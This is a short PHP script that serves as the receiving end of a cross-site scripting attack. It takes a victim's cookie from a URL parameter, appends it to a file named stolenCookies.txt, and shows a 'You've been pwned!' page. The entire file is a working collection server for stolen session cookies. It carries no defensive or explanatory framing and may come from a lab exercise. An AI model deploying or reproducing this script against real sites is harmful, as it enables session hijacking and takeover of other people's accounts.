<?php

if (isset($_GET['cookie']))
{
	$file = 'stolenCookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}

?>
<!DOCTYPE html>
<html>
<title> XSS - You've been pwned!' </title>
<body>
<h1 align="center"> XSS - You've been pwned! </h1>
</body>
</html> 